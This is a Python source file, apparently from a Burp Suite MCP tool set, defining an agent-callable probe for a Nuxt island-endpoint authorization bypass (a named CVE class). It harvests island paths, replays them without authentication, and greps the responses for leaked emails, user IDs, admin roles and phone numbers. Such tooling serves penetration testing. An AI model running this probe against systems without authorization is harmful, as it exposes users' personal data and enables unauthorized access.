"""Nuxt 3/4 island-endpoint authz probe.

CVE-2026-47200/46342 class — /__nuxt_island/<Component>/<hash> server-renders
an island component reachable without the auth middleware that protects the
parent page. Probe enumerates island URLs (from supplied list or harvested
from a baseline HTML), replays each without auth, checks for 200 + rendered
HTML containing sensitive markers.

Returns VerdictResult.
"""

from __future__ import annotations

import re

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import make_verdict, error_verdict


_ISLAND_PATH_RE = re.compile(r"(?:/__nuxt_island/[A-Za-z0-9_./-]+)")
_SENSITIVE_MARKERS = (
    re.compile(r'"email"\s*:\s*"[^"]+@', re.I),
    re.compile(r'"user_id"\s*:\s*"?\d', re.I),
    re.compile(r'"role"\s*:\s*"(admin|owner|superuser)"', re.I),
    re.compile(r'"tenant"\s*:\s*"', re.I),
    re.compile(r'"account_id"\s*:\s*"', re.I),
    re.compile(r'"phone"\s*:\s*"\+?\d', re.I),
)

_MAX_ISLANDS = 15


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_nuxt_island_authz(
        base_url: str,
        island_paths: list[str] | None = None,
        baseline_url: str | None = None,
    ) -> dict:
        """Probe Nuxt /__nuxt_island/<Component>/<hash> endpoints for authz bypass.

        CVE-2026-47200 / CVE-2026-46342 class — island endpoints rendered
        server-side without the auth middleware that gated their parent page.

        Args:
            base_url: target host base, e.g. 'https://app.example.com'.
            island_paths: explicit list of /__nuxt_island/... paths to probe
                (cap 15). When omitted, probe will GET baseline_url and
                regex-harvest island paths from the HTML.
            baseline_url: page URL to harvest island paths from when
                island_paths is omitted. Defaults to base_url.

        Returns: VerdictResult — CONFIRMED if any island returns 200 with
        sensitive marker; SUSPECTED if 200 but no marker; FAILED if all 4xx.
        """
        if not base_url:
            return error_verdict("base_url required", vuln_type="nuxt_island_authz")

        base = base_url.rstrip("/")

        paths: list[str] = []
        baseline_logger = -1
        if island_paths:
            paths = list(dict.fromkeys(p for p in island_paths if p))[:_MAX_ISLANDS]
        else:
            harvest_url = baseline_url or base
            baseline_resp = await client.post("/api/http/curl", json={
                "url": harvest_url, "method": "GET",
            })
            if "error" in baseline_resp:
                return error_verdict(
                    f"baseline fetch failed: {baseline_resp['error']}",
                    vuln_type="nuxt_island_authz",
                )
            baseline_logger = baseline_resp.get("logger_index", -1)
            body = baseline_resp.get("response_body", "") or ""
            seen = []
            for m in _ISLAND_PATH_RE.finditer(body):
                p = m.group(0)
                if p not in seen:
                    seen.append(p)
                    if len(seen) >= _MAX_ISLANDS:
                        break
            paths = seen

        if not paths:
            return make_verdict(
                "FAILED",
                0.15,
                "No /__nuxt_island/ paths found — target may not be Nuxt 3/4 or "
                "islands not used on baseline page",
                vuln_type="nuxt_island_authz",
                logger_indices=[baseline_logger] if baseline_logger >= 0 else [],
                details={"islands_seen": 0},
                summary="FAILED — no island endpoints discovered",
            )

        reproductions: list[dict] = []
        confirmed: list[dict] = []
        suspected: list[dict] = []

        for path in paths:
            url = path if path.startswith("http") else f"{base}{path}"
            # NO auth — bare GET (no session) to test authz
            resp = await client.post("/api/http/curl", json={
                "url": url, "method": "GET", "bare_headers": True,
            })
            status = resp.get("status_code") or resp.get("status")
            body = resp.get("response_body") or ""
            logger_idx = resp.get("logger_index", -1)

            entry = {
                "path": path,
                "status_code": status,
                "logger_index": logger_idx,
                "body_size": len(body),
            }

            if status == 200:
                hit_marker = None
                for rx in _SENSITIVE_MARKERS:
                    m = rx.search(body[:8192])
                    if m:
                        hit_marker = m.group(0)[:80]
                        break
                if hit_marker:
                    entry["sensitive_marker"] = hit_marker
                    confirmed.append(entry)
                else:
                    suspected.append(entry)
            reproductions.append(entry)

        logger_indices = [r["logger_index"] for r in reproductions if isinstance(r.get("logger_index"), int) and r["logger_index"] >= 0]

        if confirmed:
            sample = confirmed[0]
            return make_verdict(
                "CONFIRMED",
                0.88,
                f"Nuxt island authz bypass — {len(confirmed)} island(s) reachable "
                f"without auth AND return sensitive payload "
                f"(e.g. {sample['path']} -> {sample.get('sensitive_marker')})",
                vuln_type="nuxt_island_authz",
                logger_indices=logger_indices,
                reproductions=reproductions,
                details={
                    "islands_probed": len(paths),
                    "confirmed_count": len(confirmed),
                    "suspected_count": len(suspected),
                },
                summary=f"CONFIRMED {len(confirmed)} island(s) leak sensitive data on {base}",
            )

        if suspected:
            return make_verdict(
                "SUSPECTED",
                0.55,
                f"Nuxt islands reachable without auth ({len(suspected)} return 200) "
                "but no sensitive marker grep'd in first 8k. Manual review of "
                "island response payloads recommended.",
                vuln_type="nuxt_island_authz",
                logger_indices=logger_indices,
                reproductions=reproductions,
                details={
                    "islands_probed": len(paths),
                    "confirmed_count": 0,
                    "suspected_count": len(suspected),
                },
                summary=f"SUSPECTED {len(suspected)} unauth island(s) on {base} — review payloads",
            )

        return make_verdict(
            "FAILED",
            0.20,
            f"All {len(paths)} island endpoints returned 4xx without auth — "
            "middleware appears to gate islands correctly",
            vuln_type="nuxt_island_authz",
            logger_indices=logger_indices,
            reproductions=reproductions,
            details={"islands_probed": len(paths), "confirmed_count": 0, "suspected_count": 0},
            summary=f"FAILED — no island authz bypass on {base}",
        )
